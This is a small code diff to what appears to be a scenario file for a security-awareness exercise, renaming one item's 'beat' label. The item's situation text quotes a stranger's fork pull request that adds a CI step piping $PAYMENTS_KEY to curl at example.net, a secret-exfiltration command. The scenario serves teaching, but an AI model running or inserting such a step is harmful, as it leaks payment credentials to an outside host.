@@ -112,7 +112,7 @@ export const secretsAndUpdates = {
     },
     {
       id: 'fork-secrets',
-      beat: 'secret-vault',
+      beat: 'secret-withheld',
       kind: 'choose',
       situation:
         'Quillwork’s editor is open source. A stranger’s pull request from a fork edits ci.yml to add: run: echo $PAYMENTS_KEY | curl -d @- https://example.net',
